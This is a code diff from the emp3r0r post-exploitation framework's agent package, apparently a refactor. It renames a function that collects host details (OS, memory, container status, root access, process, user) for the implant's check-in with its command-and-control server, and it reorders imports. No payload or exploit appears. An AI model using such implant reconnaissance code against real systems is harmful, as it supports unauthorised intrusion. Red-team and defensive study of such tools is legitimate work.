@@ -2,11 +2,12 @@ package agentutils
 
 import (
 	"fmt"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"os"
 	"os/user"
 	"runtime"
 	"strings"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jaypipes/ghw"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -17,9 +18,9 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-// CollectSystemInfo build system info object
-func CollectSystemInfo() *def.Emp3r0rAgent {
-	logging.Println("Collecting system info for checking in")
+// GatherSystemDetails build system info object
+func GatherSystemDetails() *def.Emp3r0rAgent {
+	logging.Println("Collecting system info for reporting status")
 	var info def.Emp3r0rAgent
 	osinfo := sysinfo.GetOSInfo()
 	info.GOOS = runtime.GOOS
@@ -53,14 +54,14 @@ func CollectSystemInfo() *def.Emp3r0rAgent {
 	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
 	info.Hardware = util.CheckProduct(info.Product)
 	info.Container = sysinfo.CheckContainer()
-	info.Transport = GenC2TransportString()
+	info.Transport = genC2TransportString()
 	def.Transport = info.Transport
 
 	// have root?
 	info.HasRoot = sysinfo.HasRoot()
 
 	// process
-	info.Process = GetAgentProcess()
+	info.Process = getAgentProcess()
 
 	// user account info
 	u, err := user.Current()
